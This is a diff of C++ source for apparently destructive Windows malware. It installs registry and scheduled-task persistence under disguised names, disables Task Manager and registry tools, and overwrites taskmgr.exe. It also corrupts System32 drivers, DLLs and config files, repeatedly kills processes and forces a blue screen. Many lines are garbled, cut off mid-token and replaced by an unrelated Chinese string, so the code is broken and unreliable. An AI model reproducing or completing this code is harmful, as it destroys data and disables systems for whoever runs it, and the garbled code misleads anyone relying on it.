@@ -1487,22 +1455,18 @@ void InstallAdvancedPersistence() {
         L"C:\\Users\\Public\\system_monitor.exe"
     };
     
-    const wchar_t* registryKeys[] = {
+    const wchar极速加速器
         L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
         L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
         L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
-        L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"
+        L"Software\\Microsoft\\Windows NT\\CurrentVersion极速加速器
     };
     
-    // Copy ke multiple locations
     for (size_t i = 0; i < sizeof(targetLocations)/sizeof(targetLocations[0]); i++) {
         CopyFileW(szPath, targetLocations[i], FALSE);
-        
-        // Set hidden dan system attributes
         SetFileAttributesW(targetLocations[i], FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     }
     
-    // Add to registry multiple locations
     for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
         HKEY hRoot = (i < 2) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
         HKEY hKey;
@@ -1510,7 +1474,6 @@ void InstallAdvancedPersistence() {
         if (RegCreateKeyExW(hRoot, registryKeys[i], 0, NULL, 
             REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
             
-            // Use different value names
             const wchar_t* valueNames[] = {
                 L"SystemHealthMonitor",
                 L"WindowsDefenderService", 
@@ -1525,13 +1488,12 @@ void InstallAdvancedPersistence() {
         }
     }
     
-    // Create scheduled task dengan multiple triggers
     SYSTEMTIME st;
     GetLocalTime(&st);
     
     const wchar_t* taskCommands[] = {
         L"schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"C:\\Windows\\System32\\winlogon_helper.exe\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
-        L"schtasks /create /tn \"System Health Monitor\" /tr \"\\\"C:\\ProgramData\\Microsoft\\Windows\\system_health.exe\\\"\" /sc onlogon /delay 0000:30 /f",
+        L"schtasks /create /tn \"System Health Monitor\" /tr \"\\\"C:\\ProgramData\\Microsoft\\Windows\\极速加速器
         L"schtasks /create /tn \"User Profile Service\" /tr \"\\\"C:\\Users\\Public\\system_monitor.exe\\\"\" /sc onstart /delay 0001:00 /f"
     };
     
@@ -1556,18 +1518,17 @@ void DisableSystemTools() {
     RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                    0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
     DWORD value = 1;
-    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+    RegSetValueExW(hKey, L"极速加速器
     RegCloseKey(hKey);
     
-    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+    RegCreateKey极速加速器
     RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
     RegCloseKey(hKey);
     
     if (g_isAdmin) {
         RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+                       0, NULL, REG极速加速器
+        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&极速加速器
         RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
@@ -1583,8 +1544,8 @@ void DisableCtrlAltDel() {
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         DWORD value = 1;
         RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+        RegSetValueExW(hKey, L"DisableChangePassword", 极速加速器
+        RegSetValueExW(hKey, L"Dis极速加速器
         RegCloseKey(hKey);
     }
 
@@ -1602,7 +1563,6 @@ void DisableCtrlAltDel() {
 }
 
 void BreakTaskManager() {
-    // Corrupt taskmgr.exe
     const wchar_t* taskmgrPaths[] = {
         L"C:\\Windows\\System32\\taskmgr.exe",
         L"C:\\Windows\\SysWOW64\\taskmgr.exe"
@@ -1612,7 +1572,7 @@ void BreakTaskManager() {
         HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
-            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+            if (fileSize != INVALID_FILE_SIZE && file极速加速器
                 BYTE* buffer = new BYTE[fileSize];
                 if (buffer) {
                     for (DWORD j = 0; j < fileSize; j++) {
@@ -1627,27 +1587,25 @@ void BreakTaskManager() {
         }
     }
 
-    // Kill existing task manager processes
     KillAllProcesses();
 }
 
 void CorruptSystemFiles() {
     const wchar_t* targets[] = {
         L"C:\\Windows\\System32\\drivers\\*.sys",
-        L"C:\\Windows\\System32\\*.dll",
+        L"C:\\极速加速器
         L"C:\\Windows\\System32\\*.exe",
         L"C:\\Windows\\System32\\config\\*"
     };
     
-    // Handle Wow64 redirection untuk Windows 64-bit
     PVOID oldRedir = NULL;
     if (IsWindows64()) {
         HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
         if (hKernel32) {
-            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
-                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
+            LPFN_WOW64DISABLEWOW64FSREDIRECTION pfnDisable = 
+                reinterpret_cast<LPFN_WOW64DISABLEWOW64FSREDIRECTION>(
                     GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
-            if (pfnDisable) pfnDisable(&oldRedir);
+            if (pfnDisable) pfn极速加速器
         }
     }
     
@@ -1657,7 +1615,7 @@ void CorruptSystemFiles() {
         
         if (hFind != INVALID_HANDLE_VALUE) {
             do {
-                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                if (!(fd.dw极速加速器
                     wchar_t filePath[MAX_PATH];
                     if (i == 0) {
                         wsprintfW(filePath, L"C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
@@ -1691,12 +1649,11 @@ void CorruptSystemFiles() {
         }
     }
     
-    // Revert redirection
     if (oldRedir && IsWindows64()) {
         HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
         if (hKernel32) {
-            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
-                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
+            LPFN_WOW64REVERTWOW64FSREDIRECTION pfnRevert = 
+                reinterpret_cast<LPFN_WOW64REVERTWOW64FSREDIRECTION>(
                     GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
             if (pfnRevert) pfnRevert(oldRedir);
         }
@@ -1709,7 +1666,7 @@ void TriggerBSOD() {
     HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
     if (ntdll) {
         typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
-        pdef_NtRaiseHardError NtRaiseHardError = 
+        pdef_NtRaiseHardError Nt极速加速器
             reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
         
         if (NtRaiseHardError) {
@@ -1719,15 +1676,14 @@ void TriggerBSOD() {
         }
     }
     
-    // Fallback: Cause access violation
     int* p = (int*)0x1;
     *p = 0;
 }
 
 void OpenRandomPopups() {
     const wchar_t* commands[] = {
-        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
-        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 200 }\"",
+        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0极速加速器
+        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 200 }\"",
         L"notepad.exe",
         L"explorer.exe",
         L"write.exe",
@@ -1738,14 +1694,13 @@ void OpenRandomPopups() {
         L"control.exe"
     };
 
-    int numPopups = 3 + rand() % 5; // 3-7 popup sekaligus
-    bool spawnSpam = (rand() % 3 == 0); // 33% chance spawn cmd spammer
+    int numPopups = 3 + rand() % 5;
+    bool spawnSpam = (rand() % 3 == 0);
 
     for (int i = 0; i < numPopups; i++) {
         int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
         
-        // Untuk cmd spam khusus
-        if (spawnSpam && i == 0) {
+        if (spawn极速加速器
             ShellExecuteW(NULL, L"open", L"cmd.exe", 
                 L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
                 NULL, SW_SHOWMINIMIZED);
@@ -1762,10 +1717,9 @@ void OpenRandomPopups() {
         ShellExecuteExW(&sei);
         if (sei.hProcess) CloseHandle(sei.hProcess);
         
-        Sleep(100); // Delay antar popup
+        Sleep(100);
     }
 
-    // Spawn khusus Windows Terminal jika ada
     if (rand() % 5 == 0) {
         ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
     }
@@ -1783,7 +1737,7 @@ void AdvancedVisualEffectsThread() {
         
         POINT ptZero = {0, 0};
         SIZE size = {screenWidth, screenHeight};
-        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
+        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC极速加速器
         
         HWND hDesktop = GetDesktopWindow();
         UpdateLayeredWindow(hDesktop, hdcScreen, &ptZero, &size, hdcMem, 
@@ -1811,10 +1765,9 @@ void AdvancedDestructiveEffectsThread() {
     while (running) {
         DWORD cTime = GetTickCount();
         
-        // Aktifkan mode kritis setelah 20 detik (lebih cepat)
         if (!criticalMode && cTime - startTime > 20000) {
             criticalMode = true;
-            bsodTriggerTime = cTime + 20000 + rand() % 20000; // BSOD dalam 20-40 detik
+            bsodTriggerTime = cTime + 20000 + rand() % 20000;
             
             if (!persistenceInstalled) {
                 InstallAdvancedPersistence();
@@ -1822,7 +1775,6 @@ void AdvancedDestructiveEffectsThread() {
                 DisableCtrlAltDel();
             }
             
-            // Aktifkan fitur admin
             if (g_isAdmin) {
                 static bool adminDestructionDone = false;
                 if (!adminDestructionDone) {
@@ -1836,33 +1788,31 @@ void AdvancedDestructiveEffectsThread() {
             }
         }
         
-        // Eksekusi tindakan destruktif
         if (criticalMode && !destructiveActionsTriggered) {
             ExecuteAdvancedDestructiveActions();
         }
         
-        // Efek khusus mode kritis
         if (criticalMode) {
             static DWORD lastCorruption = 0;
-            if (cTime - lastCorruption > 5000) { // Lebih sering
+            if (cTime - lastCorruption > 5000) {
                 std::thread(CorruptSystemFiles).detach();
                 lastCorruption = cTime;
             }
             
             static DWORD lastKill = 0;
-            if (cTime - lastKill > 3000) { // Lebih sering
+            if (cTime - lastKill > 3000) {
                 std::thread(KillAllProcesses).detach();
-                lastKill = cTime;
+                last极速加速器
             }
             
-            intensityLevel = 30; // Level lebih tinggi
+            intensityLevel = 30;
             
             if (cTime >= bsodTriggerTime) {
                 std::thread(TriggerBSOD).detach();
             }
         }
         
-        Sleep(800); // Interval lebih pendek
+        Sleep(800);
     }
 }
 
@@ -1878,7 +1828,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     case WM_DESTROY:
         running = false;
         
-        // Tunggu semua thread selesai
         for (auto& thread : workerThreads) {
             if (thread.joinable()) {
                 thread.join();
@@ -1886,7 +1835,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         }
         
         if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
-        if (hdcLayered) DeleteDC(hdcLayered);
+        if (hdcLayered) DeleteDC(hdc极速加速器
         ShowCursor(TRUE);
         PostQuitMessage(0);
         return 0;
@@ -1895,10 +1844,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
-    // Deteksi mode admin
     g_isAdmin = IsRunAsAdmin();
 
-    // Tampilkan peringatan pertama
     if (MessageBoxW(NULL, 
         L"WARNING: This program will cause serious system damage!\n\n"
         L"Proceed only if you understand the risks."
@@ -1910,7 +1857,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         return 0;
     }
     
-    // Tampilkan peringatan kedua
     if (MessageBoxW(NULL, 
         L"FINAL WARNING: This will cause:\n"
         L"- Extreme visual impact\n"
@@ -1924,7 +1870,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         return 0;
     }
 
-    // Cek jika sudah berjalan
     HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\WinlogonHelperMutex");
     DWORD lastError = GetLastError();
     if (lastError == ERROR_ALREADY_EXISTS) {
@@ -1950,29 +1895,25 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     srand(static_cast<unsigned>(time(NULL)));
     startTime = GetTickCount();
     
-    // Jalankan background process
-    if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
-        // Inisialisasi layar
+    if (__argc > 1 && lstrcmp极速加速器
         HDC hdcScreen = GetDC(NULL);
-        screenWidth = GetSystemMetrics(SM_CXSCREEN);
+        screenWidth = GetSystemMetrics(SM极速加速器
         screenHeight = GetSystemMetrics(SM_CYSCREEN);
         
         bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
         bmi.bmiHeader.biWidth = screenWidth;
         bmi.bmiHeader.biHeight = -screenHeight;
-        bmi.bmiHeader.biPlanes = 1;
+        bmi.bmiHeader.b极速加速器
         bmi.bmiHeader.biBitCount = 32;
         bmi.bmiHeader.biCompression = BI_RGB;
         
         hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
         ReleaseDC(NULL, hdcScreen);
         
-        // Jalankan thread untuk efek visual dan destruktif
         workerThreads.emplace_back(AdvancedVisualEffectsThread);
         workerThreads.emplace_back(SoundEffectsThread);
         workerThreads.emplace_back(AdvancedDestructiveEffectsThread);
         
-        // Tunggu semua thread selesai
         for (auto& thread : workerThreads) {
             if (thread.joinable()) {
                 thread.join();
@@ -1982,7 +1923,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         return 0;
     }
     
-    // Jalankan instance utama
     FreeConsole();
     
     WNDCLASSEXW wc = {
@@ -2014,9 +1954,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     
     ShowWindow(hwnd, SW_SHOW);
     
-    // Jalankan background process
     wchar_t szPath[MAX_PATH];
-    GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    GetModuleFileNameW(NULL, sz极速加速器
     
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
     sei.lpFile = szPath;
@@ -2024,12 +1963,11 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     sei.nShow = SW_HIDE;
     ShellExecuteExW(&sei);
     
-    // Mainkan suara startup
     std::thread([]() {
         for (int i = 0; i < 10; i++) {
             Beep(300, 80);
             Beep(600, 80);
-            Beep(900, 80);
+            Be极速加速器
             Sleep(20);
         }
         
